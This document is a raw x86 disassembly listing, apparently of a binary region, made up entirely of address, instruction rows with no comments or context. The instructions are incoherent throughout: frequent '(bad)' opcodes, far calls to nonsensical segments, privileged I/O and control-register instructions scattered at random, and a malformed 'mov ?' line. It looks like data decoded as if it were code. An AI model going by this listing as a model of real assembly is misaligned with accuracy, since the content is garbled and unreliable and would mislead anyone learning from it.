  4152e6:	imul   edi,DWORD PTR [ebx+0x0],0xffffff95
  4152ea:	mov    cs:0xfebde611,al
  4152f0:	adc    ch,BYTE PTR [esi+0x4b]
  4152f3:	mov    al,ds:0x14d57bfe
  4152f8:	dec    ebx
  4152f9:	fild   WORD PTR [esi-0x35]
  4152fc:	in     eax,dx
  4152fd:	cmp    ecx,DWORD PTR [ebp+0x3e]
  415300:	xor    edx,eax
  415302:	stc    
  415303:	je     0x41528f
  415305:	jmp    0x2ae9a5ea
  41530a:	jo     0x41534a
  41530c:	sbb    BYTE PTR [edi+0x43],0xc7
  415310:	mov    al,ds:0x64c6fe09
  415315:	sar    BYTE PTR [edx+0x372e33d6],1
  41531b:	sbb    ebp,ebx
  41531d:	jle    0x4152b4
  41531f:	mov    ch,0x2c
  415321:	fisttp QWORD PTR [esi+0x5b]
  415324:	out    0xa1,eax
  415326:	jns    0x41538a
  415328:	cdq    
  415329:	dec    edx
  41532a:	or     DWORD PTR [edi+0x5],esi
  41532d:	dec    esp
  41532e:	(bad)  
  41532f:	in     eax,0x69
  415331:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415332:	(bad)  
  415333:	mov    ds:0x4f44ed68,eax
  415338:	or     BYTE PTR [eax-0xf2c0de7],0x3a
  41533f:	xchg   edi,eax
  415340:	adc    al,0xd6
  415342:	jne    0x4153b9
  415344:	dec    eax
  415345:	inc    eax
  415346:	call   0x1c1:0x32ba149d
  41534d:	pop    ebp
  41534e:	xor    bh,cl
  415350:	imul   esi,DWORD PTR [eax+0x150d87d9],0x58b645b5
  41535a:	inc    edi
  41535b:	and    ah,BYTE PTR [esi+0x1feddbd1]
  415361:	push   esp
  415362:	or     DWORD PTR [ebx],esp
  415364:	mov    dl,0x21
  415366:	xor    edi,DWORD PTR ds:0xf18ab8e5
  41536c:	and    al,0x47
  41536e:	jne    0x41532d
  415370:	sub    bh,dh
  415372:	fst    DWORD PTR [edi+edi*2]
  415375:	lahf   
  415376:	cs push ss
  415378:	call   0xd324e8c6
  41537d:	inc    eax
  41537e:	loope  0x4153bc
  415380:	or     al,0xf2
  415382:	xlat   BYTE PTR ds:[ebx]
  415383:	call   0x1bad:0x577a60d2
  41538a:	or     eax,0xba4b9262
  41538f:	jbe    0x4153fe
  415391:	(bad)  
  415392:	jp     0x415356
  415394:	jbe    0x415333
  415396:	adc    esi,eax
  415398:	out    0x9f,al
  41539a:	jg     0x41540f
  41539c:	push   ss
  41539d:	mov    dh,0x8f
  41539f:	push   ebx
  4153a0:	shl    BYTE PTR [ebx+0xb],cl
  4153a3:	ss dec ebx
  4153a5:	cdq    
  4153a6:	fdivr  DWORD PTR [ebp+0x21c0abdd]
  4153ac:	dec    esp
  4153ad:	mov    dl,cl
  4153af:	sub    al,0xb5
  4153b1:	push   esi
  4153b2:	mov    edi,0x99fe3640
  4153b7:	dec    ebx
  4153b8:	dec    ecx
  4153b9:	sar    DWORD PTR [ebp+edi*2+0x64],1
  4153bd:	ror    BYTE PTR [edx],0xb1
  4153c0:	imul   edx,DWORD PTR [esi],0x29
  4153c3:	xor    DWORD PTR [ecx],esp
  4153c5:	imul   ebx,DWORD PTR [esi+0x5e],0xfffffffd
  4153c9:	idiv   eax
  4153cb:	and    DWORD PTR [ecx+esi*8],esi
  4153ce:	sub    eax,0x8170c406
  4153d3:	fwait
  4153d4:	and    eax,0x610af36a
  4153d9:	push   ebx
  4153da:	aas    
  4153db:	ror    ebx,cl
  4153dd:	mov    ah,0x48
  4153df:	cmp    al,bh
  4153e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4153e2:	cld    
  4153e3:	outs   dx,BYTE PTR ds:[esi]
  4153e4:	mov    BYTE PTR [ebx+0x26],al
  4153e7:	ficomp WORD PTR [edx-0x3]
  4153ea:	rol    BYTE PTR [esi-0x7],0x5b
  4153ee:	push   esp
  4153ef:	dec    esi
  4153f0:	jns    0x41537e
  4153f2:	cmp    edi,DWORD PTR [esi]
  4153f4:	pop    esi
  4153f5:	fwait
  4153f6:	or     eax,DWORD PTR [eax+edi*8-0x29839807]
  4153fd:	or     BYTE PTR [edx],ch
  4153ff:	mov    bl,BYTE PTR [ecx+0x51df0118]
  415405:	addr16 jmp 0xdaf0fdd2
  41540b:	inc    esp
  41540c:	out    dx,eax
  41540d:	ret    
  41540e:	(bad)  
  41540f:	mov    ds,WORD PTR [edi]
  415411:	fstp   TBYTE PTR [ecx-0x4c]
  415414:	icebp  
  415415:	frstor [eax]
  415417:	pop    es
  415418:	repnz cmc 
  41541a:	les    edi,FWORD PTR [esp+esi*8]
  41541d:	cmp    ebp,DWORD PTR [esi-0x167749d4]
  415423:	and    edx,ebx
  415425:	les    ecx,FWORD PTR [edx-0x42]
  415428:	aad    0xe4
  41542a:	sub    DWORD PTR [ecx-0x70167b18],eax
  415430:	xchg   BYTE PTR [esi+0x75],bl
  415433:	in     al,dx
  415434:	or     al,0x62
  415436:	xchg   edx,eax
  415437:	mov    edi,DWORD PTR [edx]
  415439:	mov    BYTE PTR es:[ebx],ah
  41543c:	xlat   BYTE PTR ds:[ebx]
  41543d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41543e:	mov    bh,0x33
  415440:	mov    eax,ds:0x580ae391
  415445:	iret   
  415446:	mov    dh,0x76
  415448:	or     eax,0xaa83ca2e
  41544d:	sbb    DWORD PTR [edi],ebx
  41544f:	pop    esi
  415450:	(bad)  
  415451:	ds dec esp
  415453:	dec    ecx
  415454:	ins    BYTE PTR es:[edi],dx
  415455:	inc    eax
  415456:	popa   
  415457:	dec    esi
  415458:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415459:	lods   eax,DWORD PTR ds:[esi]
  41545a:	xor    BYTE PTR [esi-0x5e],cl
  41545d:	pusha  
  41545e:	xor    edx,DWORD PTR [esi-0x6b4098c8]
  415464:	mov    esp,0x83965e73
  415469:	loop   0x41543f
  41546b:	std    
  41546c:	sub    al,0x81
  41546e:	jne    0x4154b3
  415470:	xchg   DWORD PTR [eax-0x39bce5cc],ebx
  415476:	ss data16 fwait
  415479:	pop    ebp
  41547a:	xor    ebp,edx
  41547c:	adc    esi,ebp
  41547e:	or     al,BYTE PTR [edi+0x79c8e5c8]
  415484:	cdq    
  415485:	add    esi,ebp
  415487:	xor    eax,0x8bf923e7
  41548c:	jmp    0x9c98:0x9a98f301
  415493:	jmp    0x2cf53c83
  415498:	xor    al,BYTE PTR [edi+edx*4]
  41549b:	sar    BYTE PTR [ecx+ecx*4],1
  41549e:	jmp    0x8947:0x46eec2f
  4154a5:	cmp    DWORD PTR [ecx+0x7f44bde9],ebx
  4154ab:	jmp    0x41550c
  4154ad:	mov    cr0,ebx
  4154b0:	outs   dx,DWORD PTR ds:[esi]
  4154b1:	or     al,0xf1
  4154b3:	xor    DWORD PTR [esi-0x61],0xf8857c
  4154ba:	push   edx
  4154bb:	outs   dx,BYTE PTR ds:[esi]
  4154bc:	pop    edi
  4154bd:	or     eax,0x4408014a
  4154c2:	jl     0x4154e6
  4154c4:	dec    edx
  4154c5:	mov    WORD PTR [edi],cs
  4154c7:	into   
  4154c8:	adc    edi,DWORD PTR ds:[eax]
  4154cb:	aad    0x61
  4154cd:	sub    DWORD PTR [eax],esi
  4154cf:	or     al,0x3f
  4154d1:	out    0xcf,eax
  4154d3:	mov    esi,0xb6a803b
  4154d8:	push   esp
  4154d9:	cdq    
  4154da:	retf   0x3c86
  4154dd:	daa    
  4154de:	loop   0x4154a6
  4154e0:	add    eax,0xaface8cb
  4154e5:	lock mov al,ds:0x10fe5ce4
  4154eb:	pop    ebp
  4154ec:	fstp   QWORD PTR [ecx-0x76]
  4154ef:	je     0x415499
  4154f1:	inc    BYTE PTR [ebp-0x23]
  4154f4:	and    BYTE PTR [edi+ebx*4+0x572af3ad],dl
  4154fb:	push   edx
  4154fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4154fd:	mov    ch,0x16
  4154ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415500:	dec    ecx
  415501:	jns    0x4154cb
  415503:	repnz sbb eax,0x154ac50d
  415509:	push   ss
  41550a:	mov    ecx,0x6affabc2
  41550f:	cmc    
  415510:	shr    cl,1
  415512:	push   ss
  415513:	inc    di
  415515:	cwde   
  415516:	xor    ebp,DWORD PTR [ebx-0x2990d144]
  41551c:	dec    ecx
  41551d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41551e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41551f:	sbb    ch,BYTE PTR [edx+0x9]
  415522:	or     DWORD PTR [edx+ebp*4],eax
  415525:	nop
  415526:	jnp    0x4154dd
  415528:	(bad)  
  415529:	xlat   BYTE PTR ds:[ebx]
  41552a:	jo     0x415511
  41552c:	mov    edx,DWORD PTR [eax+0x6a]
  41552f:	scas   eax,DWORD PTR es:[edi]
  415530:	sub    eax,0x5d67e4c9
  415535:	aam    0xc1
  415537:	sbb    BYTE PTR [edx+0x450f07f7],cl
  41553d:	neg    esp
  41553f:	push   edx
  415540:	into   
  415541:	aas    
  415542:	sbb    ebp,esp
  415544:	pop    esp
  415545:	sbb    ah,BYTE PTR ds:0x7f1da1b5
  41554b:	jmp    DWORD PTR [ebp+0x77]
  41554e:	(bad)  
  41554f:	call   0x9696:0x633c563e
  415556:	xchg   esp,eax
  415557:	popa   
  415558:	mov    bl,0xba
  41555a:	push   edi
  41555b:	and    eax,0x2c51b721
  415560:	or     eax,0x9b8b5088
  415565:	pop    esi
  415566:	pop    ds
  415567:	mul    BYTE PTR [ecx]
  415569:	push   cs
  41556a:	mov    dl,0xc0
  41556c:	sbb    DWORD PTR [ecx+ebx*2+0x37170118],esp
  415573:	cs push ds
  415575:	loop   0x4155f6
  415577:	xor    BYTE PTR [esi+eax*8],bh
  41557a:	cmp    edi,DWORD PTR [edi]
  41557c:	jmp    0xfae6:0xb5e783f2
  415583:	shr    BYTE PTR [ebp-0x163d50f9],1
  415589:	call   0x82df:0x739716ae
  415590:	mov    dl,0x5e
  415592:	or     al,0xbb
  415594:	ds xchg edi,eax
  415596:	xor    dl,ah
  415598:	mov    bh,0xb6
  41559a:	nop
  41559b:	pusha  
  41559c:	inc    ebx
  41559d:	(bad)  
  41559e:	ss gs in al,0xb3
  4155a2:	fimul  WORD PTR [esi]
  4155a4:	xchg   edi,eax
  4155a5:	and    BYTE PTR [ebp+0x1],dl
  4155a8:	push   edx
  4155a9:	add    dh,BYTE PTR [ebp+eiz*1-0x5058e753]
  4155b0:	xor    al,0x4b
  4155b2:	int3   
  4155b3:	retf   
  4155b4:	sti    
  4155b5:	jo     0x4155ee
  4155b7:	xor    al,0xac
  4155b9:	test   eax,0x187f27b6
  4155be:	push   eax
  4155bf:	push   esi
  4155c0:	sbb    ecx,DWORD PTR [eax+0x5b]
  4155c3:	inc    bp
  4155c5:	leave  
  4155c6:	ds in  al,0xcf
  4155c9:	xchg   ebx,eax
  4155ca:	sbb    bl,BYTE PTR [eax+0x2076957f]
  4155d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4155d1:	add    dl,BYTE PTR [esi-0x53]
  4155d4:	sub    BYTE PTR [edi],ch
  4155d6:	jge    0x415566
  4155d8:	outs   dx,DWORD PTR ds:[esi]
  4155d9:	or     eax,0x7bbee4ff
  4155de:	pop    ecx
  4155df:	adc    DWORD PTR [esi-0x79f98327],eax
  4155e5:	in     al,dx
  4155e6:	jmp    0x531a:0x747db7c
  4155ed:	in     eax,dx
  4155ee:	pushf  
  4155ef:	fcomp  QWORD PTR [edi]
  4155f1:	inc    esi
  4155f2:	and    ah,0x2a
  4155f5:	in     eax,0x27
  4155f7:	jb     0x415585
  4155f9:	xchg   ebx,eax
  4155fa:	add    ch,ch
  4155fc:	mov    al,ds:0xf97f589d
  415601:	inc    edi
  415602:	outs   dx,BYTE PTR ds:[esi]
  415603:	and    al,0x88
  415605:	call   0x22fd:0x3a2e83ec
  41560c:	pop    es
  41560d:	mov    ch,0xcd
  41560f:	cmp    eax,0x7c7f4e28
  415614:	inc    esp
  415615:	mov    ch,0x5e
  415617:	(bad)  
  415618:	mov    cl,0x7d
  41561a:	sub    DWORD PTR [edx+0x1748505e],ebx
  415620:	ins    DWORD PTR es:[edi],dx
  415621:	or     ebp,esi
  415623:	jg     0x41563e
  415625:	leave  
  415626:	mov    BYTE PTR [esi-0x73da43de],0x54
  41562d:	es sti 
  41562f:	xor    al,0xef
  415631:	mov    dl,0xfe
  415633:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415634:	imul   eax,DWORD PTR [edx-0x1c],0x15
  415638:	or     eax,ebp
  41563a:	jmp    0xc21e8f64
  41563f:	stc    
  415640:	outs   dx,BYTE PTR ds:[esi]
  415641:	mov    ebx,DWORD PTR [ebx-0x29]
  415644:	and    DWORD PTR [ebx+0xb5d68cc],0x66
  41564b:	das    
  41564c:	mov    esi,0xafb8325a
  415651:	(bad)  
  415652:	pusha  
  415653:	mov    edx,0xf132a7bb
  415658:	push   es
  415659:	dec    edi
  41565a:	pop    eax
  41565b:	xchg   ebp,eax
  41565c:	adc    eax,0x54945c24
  415661:	dec    esi
  415662:	mov    DWORD PTR [eax-0x74],ebp
  415665:	and    WORD PTR [eax-0x7c],ax
  415669:	pop    ss
  41566a:	dec    esp
  41566b:	aad    0x86
  41566d:	call   0xafab3d19
  415672:	add    eax,0x9786b3e8
  415677:	stc    
  415678:	mov    ecx,0x554102dd
  41567d:	out    dx,al
  41567e:	imul   edi,DWORD PTR [edi+edx*2],0xffffff84
  415682:	inc    ebp
  415683:	add    al,cl
  415685:	arpl   WORD PTR [esi-0x1b],sp
  415688:	inc    ecx
  415689:	fwait
  41568a:	xchg   ebp,eax
  41568b:	xchg   ebx,eax
  41568c:	arpl   WORD PTR [ecx],bp
  41568e:	fldcw  WORD PTR [esi]
  415690:	sar    esp,cl
  415692:	imul   edx,DWORD PTR [bp+si],0xeb909879
  415699:	loope  0x4156ca
  41569b:	sbb    al,0xcb
  41569d:	add    BYTE PTR [ebx+0x2],0x4a
  4156a1:	dec    edi
  4156a2:	ss jmp 0x5eb4:0xbdcce0ed
  4156aa:	outs   dx,DWORD PTR ds:[esi]
  4156ab:	mov    dh,0xa8
  4156ad:	imul   edx,DWORD PTR [esi-0x2da27ef7],0xea97aef3
  4156b7:	call   0x8130:0x276d39a9
  4156be:	jbe    0x41573c
  4156c0:	fs cld 
  4156c2:	scas   eax,DWORD PTR es:[edi]
  4156c3:	div    BYTE PTR [ecx+ebp*1]
  4156c6:	mov    esp,0x3a0691ca
  4156cb:	lods   al,BYTE PTR ds:[esi]
  4156cc:	stos   BYTE PTR es:[edi],al
  4156cd:	inc    esp
  4156ce:	(bad)  
  4156cf:	jne    0x4156e9
  4156d1:	enter  0x9154,0x89
  4156d5:	fidiv  WORD PTR [eax+0x34]
  4156d8:	hlt    
  4156d9:	in     al,dx
  4156da:	cld    
  4156db:	sub    ecx,DWORD PTR [edx-0x646ffa42]
  4156e1:	imul   ebp,DWORD PTR [ecx+ebx*4-0x67],0x6
  4156e6:	scas   eax,DWORD PTR es:[edi]
  4156e7:	test   eax,0xfea22d1
  4156ec:	xor    dl,dh
  4156ee:	test   eax,0xf0182a1c
  4156f3:	and    al,0x66
  4156f5:	imul   edx,DWORD PTR [ecx],0x63
  4156f8:	xchg   ecx,eax
  4156f9:	inc    esp
  4156fa:	inc    esp
  4156fb:	neg    BYTE PTR gs:[ecx]
  4156fe:	imul   ecx,DWORD PTR [esp+ebx*1+0x64f982b9],0xffffffa6
  415706:	rcr    BYTE PTR [ebp+0x7a],0x7a
  41570a:	in     al,dx
  41570b:	mov    ch,0xab
  41570d:	inc    edx
  41570e:	xor    DWORD PTR [esi-0x734c5cbd],edx
  415714:	cmp    BYTE PTR [esi],dh
  415716:	add    ebx,DWORD PTR [edi-0x2647b3e9]
  41571c:	inc    ebx
  41571d:	outs   dx,DWORD PTR ds:[esi]
  41571e:	cdq    
  41571f:	cmc    
  415720:	xchg   esp,eax
  415721:	jge    0x4156fe
  415723:	out    dx,al
  415724:	sub    bl,BYTE PTR [ebp-0x5e]
  415727:	inc    edx
  415728:	test   DWORD PTR [edi-0x64],edx
  41572b:	jecxz  0x41576f
  41572d:	add    ebp,DWORD PTR [ebx+0x518b7322]
  415733:	jp     0x415732
  415735:	enter  0xc029,0x55
  415739:	and    ecx,edi
  41573b:	cmp    dl,BYTE PTR [ecx]
  41573d:	add    al,0x32
  41573f:	dec    ebp
  415740:	push   edx
  415741:	mov    BYTE PTR [esi],al
  415743:	imul   esi,DWORD PTR [ecx+0x2d],0xffffffae
  415747:	jmp    0x41570a
  415749:	loopne 0x415780
  41574b:	sar    BYTE PTR [ebx+0x69],cl
  41574e:	xchg   esi,eax
  41574f:	std    
  415750:	fst    DWORD PTR [edx-0x53]
  415753:	mov    ebp,0xd0979a04
  415758:	lea    eax,[edi-0x363145c7]
  41575e:	xchg   ebp,eax
  41575f:	mov    edx,0x69fa1487
  415764:	sbb    al,0xc5
  415766:	in     eax,dx
  415767:	cmp    BYTE PTR [ebx],dh
  415769:	aam    0x1d
  41576b:	std    
  41576c:	lahf   
  41576d:	in     al,0xe4
  41576f:	mov    WORD PTR [edx-0x6fca035a],gs
  415775:	scas   eax,DWORD PTR es:[edi]
  415776:	aaa    
  415777:	sub    dh,BYTE PTR [esi]
  415779:	jp     0x4157dd
  41577b:	dec    esp
  41577c:	fadd   st,st(7)
  41577e:	mov    esi,0xc1608cca
  415783:	fld    TBYTE PTR [ecx+0x1de91c37]
  415789:	xchg   edx,eax
  41578a:	add    al,BYTE PTR [eax+0x61efeff5]
  415790:	not    BYTE PTR [ebp-0x31866bac]
  415796:	cmc    
  415797:	arpl   WORD PTR [edx],ax
  415799:	mov    dl,bl
  41579b:	rol    BYTE PTR [edi+0x1],1
  41579e:	paddusw mm1,QWORD PTR [ecx]
  4157a1:	dec    ebx
  4157a2:	mov    DWORD PTR [eax+0x66fa98f2],esi
  4157a8:	dec    esp
  4157a9:	popf   
  4157aa:	stc    
  4157ab:	jmp    0x4157b2
  4157ad:	mov    cl,0xf7
  4157af:	clc    
  4157b0:	mov    bh,0x91
  4157b2:	icebp  
  4157b3:	addr16 jg 0x415818
  4157b6:	mov    al,0x60
  4157b8:	call   0xd18f:0xdf57b1cb
  4157bf:	outs   dx,BYTE PTR ds:[esi]
  4157c0:	loope  0x4157b4
  4157c2:	jmp    0xd9b4c1a2
  4157c7:	jp     0x41577e
  4157c9:	or     al,0xb1
  4157cc:	add    al,0x19
  4157ce:	dec    edx
  4157cf:	sbb    DWORD PTR [eax+0x3a],esi
  4157d2:	jno    0x41581a
  4157d4:	xor    eax,0x6abb3ba8
  4157d9:	jne    0x41581d
  4157db:	jle    0x4157b6
  4157dd:	lock mov DWORD PTR [edx],0x6cfb5e17
  4157e4:	mov    ecx,eax
  4157e6:	rcr    DWORD PTR [ecx-0x32],cl
  4157e9:	js     0x4157e7
  4157eb:	and    esi,esi
  4157ed:	ret    0xa9dd
  4157f0:	mul    ecx
  4157f2:	or     BYTE PTR [edx-0x7],0xf3
  4157f6:	pop    ebp
  4157f7:	stos   DWORD PTR es:[edi],eax
  4157f8:	addr16 mul eax
  4157fb:	call   0x61f072ce
  415800:	cmp    ebx,DWORD PTR ds:0xd7090173
  415806:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415807:	call   0xe206:0xb5ac7079
  41580e:	jno    0x4157b8
  415810:	cwde   
  415811:	fs or  al,0x8d
  415814:	(bad)  
  415815:	xchg   ebx,eax
  415816:	or     al,0x5b
  415818:	fcomp  DWORD PTR [edi]
  41581a:	aam    0x14
  41581c:	pop    edi
  41581d:	addr16 icebp 
  41581f:	adc    dl,BYTE PTR [ecx-0x32]
  415822:	je     0x4157fe
  415824:	sar    BYTE PTR [eax],0xd1
  415827:	daa    
  415828:	ja     0x41588d
  41582a:	xchg   ecx,eax
  41582b:	outs   dx,BYTE PTR ds:[esi]
  41582c:	loope  0x415858
  41582e:	in     eax,dx
  41582f:	imul   esi,DWORD PTR ds:0x7d722c98,0x13
  415836:	push   0x2411e667
  41583b:	aad    0xa9
  41583d:	fs add al,0xfd
  415840:	jl     0x415839
  415842:	mov    bl,BYTE PTR [esi]
  415844:	mov    ch,0x34
  415846:	loope  0x415862
  415848:	dec    esi
  415849:	cs retf 
  41584b:	xchg   DWORD PTR [ebx-0x5a1675a],ecx
  415851:	xor    al,0xe3
  415853:	push   ebp
  415854:	cmc    
  415855:	in     al,0xca
  415857:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415858:	mov    ch,0xda
  41585a:	xchg   ebx,eax
  41585b:	rol    DWORD PTR [edx+eax*2+0x39],cl
  41585f:	(bad)  
  415860:	out    0x81,eax
  415862:	sbb    esi,ebp
  415864:	cdq    
  415865:	jg     0x4158b8
  415867:	loope  0x41587b
  415869:	cmp    eax,0xa5bc4821
  41586e:	cld    
  41586f:	dec    esi
  415870:	jp     0x4158ad
  415872:	loop   0x415865
  415874:	test   edi,ecx
  415876:	aas    
  415877:	sub    BYTE PTR [eax],ah
  415879:	cld    
  41587a:	and    al,0xeb
  41587c:	adc    dh,BYTE PTR [edi]
  41587e:	test   al,0x91
  415880:	out    dx,al
  415881:	shrd   DWORD PTR [edi+0x6],edi,cl
  415885:	into   
  415886:	mov    esi,0xb72a2a68
  41588b:	jbe    0x41582a
  41588d:	(bad)
  415891:	rol    BYTE PTR [eax+ebp*1-0x53c89461],0xcc
  415899:	jmp    0xb78f:0x1e004f17
  4158a0:	fistp  DWORD PTR [ebx+0x1bd959f7]
  4158a6:	jne    0x4158a1
  4158a8:	cmp    BYTE PTR [edi+0x76072c0e],0x9f
  4158af:	push   0xf54a911c
  4158b4:	scas   al,BYTE PTR es:[edi]
  4158b5:	dec    ebx
  4158b6:	push   ss
  4158b7:	xchg   esi,eax
  4158b8:	test   BYTE PTR [edx-0x17e2fd34],0xdb
  4158bf:	adc    BYTE PTR [edx],ch
  4158c1:	mov    dl,0x36
  4158c3:	dec    edi
  4158c4:	inc    eax
  4158c5:	inc    dl
  4158c7:	cmp    DWORD PTR [ebx-0x20],edi
  4158ca:	rol    edx,1
  4158cc:	test   eax,0x4626fa5
  4158d1:	aam    0xfa
  4158d3:	arpl   WORD PTR [edi+0x14],si
  4158d6:	pop    es
  4158d7:	or     BYTE PTR [edx+0x3f3f03db],bh
  4158dd:	or     ch,BYTE PTR [edi+0x518f9086]
  4158e3:	les    esp,FWORD PTR [edi]
  4158e5:	adc    ebp,DWORD PTR [eax+0x1419709f]
  4158eb:	stc    
  4158ec:	les    eax,FWORD PTR [eax]
  4158ee:	pop    ebp
  4158ef:	push   eax
  4158f0:	adc    eax,0x6d8a0748
  4158f5:	test   eax,0x3ae0364a
  4158fa:	pop    ss
  4158fb:	lods   eax,DWORD PTR ds:[esi]
  4158fc:	pextrw esp,(bad),0xc5
  4158fe:	and    dl,BYTE PTR [edi+0x2bcfa06f]
  415904:	js     0x415972
  415906:	lea    eax,[ecx-0x4f]
  415909:	shl    DWORD PTR [edi+ecx*1],1
  41590c:	aam    0xa0
  41590e:	mov    eax,ds:0xb01653ef
  415913:	adc    BYTE PTR [ecx],bl
  415915:	push   ecx
  415916:	dec    ebp
  415917:	out    dx,al
  415918:	xchg   esp,eax
  415919:	inc    edi
  41591a:	mov    dl,0x50
  41591c:	cmp    cl,BYTE PTR [edx+ecx*1]
  41591f:	scas   al,BYTE PTR es:[edi]
  415920:	sbb    eax,0xdd0d4c8e
  415925:	enter  0x87d5,0x86
  415929:	push   ecx
  41592a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41592b:	mov    edx,0x4cda00c4
  415930:	call   0xd00b:0x2609377
  415937:	mov    ds:0xfb22a993,al
  41593c:	sti    
  41593d:	jecxz  0x415989
  41593f:	xlat   BYTE PTR ds:[ebx]
  415940:	jno    0x415973
  415942:	test   BYTE PTR [ebp-0x75],dh
  415945:	icebp  
  415946:	cmc    
  415947:	and    ebp,DWORD PTR [esi-0x75]
  41594a:	push   es
  41594b:	and    DWORD PTR [ebp-0x6e024b6a],esp
  415951:	sbb    al,0x38
  415953:	ret    0x4ff9
  415956:	aas    
  415957:	adc    al,0x2d
  415959:	(bad)  
  41595a:	mov    ebx,0xe57adcff
  41595f:	outs   dx,DWORD PTR ds:[esi]
  415960:	sti    
  415961:	pop    es
  415962:	pop    ecx
  415963:	xchg   ebp,eax
  415964:	aad    0xff
  415966:	sbb    dh,BYTE PTR [esi]
  415968:	xor    DWORD PTR [ebx+0xe],ebp
  41596b:	repz mov esi,0xec3afecd
  415971:	mov    ?,WORD PTR [edi+0x34479352]
  415977:	loop   0x415966
  415979:	pop    eax
  41597a:	ins    BYTE PTR es:[edi],dx
  41597b:	mov    ecx,0x37f2eb80
  415980:	cmp    bl,cl
  415982:	sbb    ah,ah
  415984:	fcomp  DWORD PTR ds:0xc7b295f8
  41598a:	call   0x694903e4
  41598f:	xor    cl,dl
  415991:	inc    ebp
  415992:	inc    edi
  415993:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415994:	lea    ebx,[ebx]
  415996:	pop    eax
  415997:	addr16 fwait
  415999:	push   es
  41599a:	enter  0x758a,0x56
  41599e:	mov    ds:0x40121ac,eax
  4159a3:	pusha  
  4159a4:	std    
  4159a5:	dec    ebx
  4159a6:	and    BYTE PTR [bp+si-0x4c],al
  4159aa:	sub    al,0x9b
  4159ac:	int    0x51
  4159ae:	test   edx,esi
  4159b0:	dec    ecx
  4159b1:	cdq    
  4159b2:	scas   al,BYTE PTR es:[edi]
  4159b3:	sti    
  4159b4:	mov    ecx,DWORD PTR [esi]
  4159b6:	xor    al,0xbb
  4159b8:	bound  edi,QWORD PTR [esi+eiz*1]
  4159bb:	test   eax,edi
  4159bd:	cs nop
  4159bf:	(bad)  
  4159c0:	das    
  4159c1:	icebp  
  4159c2:	(bad)  
  4159c3:	add    eax,edx
  4159c5:	mov    esi,0x9af353ea
  4159ca:	dec    ecx
  4159cb:	ret    
  4159cc:	cwde   
  4159cd:	loopne 0x415961
  4159cf:	cmp    al,0xd8
  4159d1:	stc    
  4159d2:	mov    bl,0x12
  4159d4:	and    ecx,DWORD PTR [ebx-0x14]
  4159d7:	pop    ebx
  4159d8:	cmp    edi,DWORD PTR [edi]
  4159da:	dec    BYTE PTR [esi+0x724419dc]
  4159e0:	xchg   edx,eax
  4159e1:	mov    DWORD PTR [eax+ebp*4],edx
  4159e4:	jl     0x415a63
  4159e6:	and    BYTE PTR [ecx+0x33d9626],0x66
  4159ed:	sub    eax,0x8152d370
  4159f2:	xchg   esi,eax
  4159f3:	test   eax,0x2ab71bb
  4159f9:	jbe    0x415994
  4159fb:	ficomp WORD PTR [ecx+0x452f9ea3]
  415a01:	div    ebp
  415a03:	adc    BYTE PTR [ecx],dh
  415a05:	(bad)  
  415a06:	sbb    ebp,ebp
  415a08:	or     DWORD PTR [ecx-0x1f],0xf66370a6
  415a0f:	test   BYTE PTR ds:0xc4fe6abd,dl
  415a15:	xchg   esi,eax
  415a16:	jle    0x4159a6
  415a18:	adc    ebp,DWORD PTR ds:0xd3e56a61
  415a1e:	dec    ebp
  415a1f:	das    
  415a20:	rcl    DWORD PTR [ebx+ecx*1],cl
  415a23:	cmp    edx,DWORD PTR [ecx+edx*4-0x10]
  415a27:	add    al,0xad
  415a29:	pop    ecx
  415a2a:	inc    esp
  415a2b:	jnp    0x415a41
  415a2d:	jno    0x4159d1
  415a2f:	test   DWORD PTR [esi+0x7da020a0],edx
  415a35:	and    BYTE PTR [ebp+eax*4+0x6d],0xe2
  415a3a:	mul    BYTE PTR [eax+0x5e]
  415a3d:	stos   BYTE PTR es:[edi],al
  415a3e:	sub    DWORD PTR ds:0xe4976c0a,ebp
  415a44:	out    dx,al
  415a45:	inc    ecx
  415a46:	hlt    
  415a47:	push   edi
  415a48:	arpl   WORD PTR [ebx],di
  415a4a:	addr16 dec edi
  415a4c:	jp     0x415a0d
  415a4e:	cmp    esi,DWORD PTR [edx-0x2]
  415a51:	jp     0x415a16
  415a53:	xor    DWORD PTR [edx],ecx
  415a55:	mov    ah,0x4b
  415a57:	fcom   DWORD PTR [ecx+0x222efb5a]
  415a5d:	inc    esi
  415a5e:	mov    bl,0xac
  415a60:	ss sahf 
  415a62:	fnsave [ebp-0x1bbfeda4]
  415a68:	out    dx,al
  415a69:	mov    edx,0xb6e59138
  415a6e:	inc    esp
  415a6f:	push   esp
  415a70:	fistp  QWORD PTR [ebx+0x5ff6bfcc]
  415a76:	add    al,0x1d
  415a78:	xchg   ecx,eax
  415a79:	jg     0x415adb
  415a7b:	(bad)  
  415a7c:	nop
  415a7d:	cli    
  415a7e:	pop    ss
  415a7f:	cli    
  415a80:	sub    eax,0xb2dd4ba2
  415a85:	or     al,0xbe
  415a87:	mov    eax,ds:0xd07cee80
  415a8c:	call   0xb97c8491
  415a91:	sar    DWORD PTR [edx-0xe],0xa9
  415a95:	jl     0x415a97
  415a97:	add    eax,0xc27de9ee
  415a9c:	cmp    cl,BYTE PTR [edx-0x27]
  415a9f:	jge    0x415aef
  415aa1:	jecxz  0x415a4d
  415aa3:	sub    ch,BYTE PTR [eax-0x5d]
  415aa6:	fstp   TBYTE PTR [esi+0x6bf527f5]
  415aac:	dec    ebp
  415aad:	pusha  
  415aae:	inc    ebp
  415aaf:	iret   
  415ab0:	inc    esi
  415ab1:	jge    0x415a4a
  415ab3:	fidivr DWORD PTR [ebx]
  415ab5:	data16 adc BYTE PTR [ebp+0x6eac43cf],cl
  415abc:	or     BYTE PTR [eax-0x5362c876],0xd2
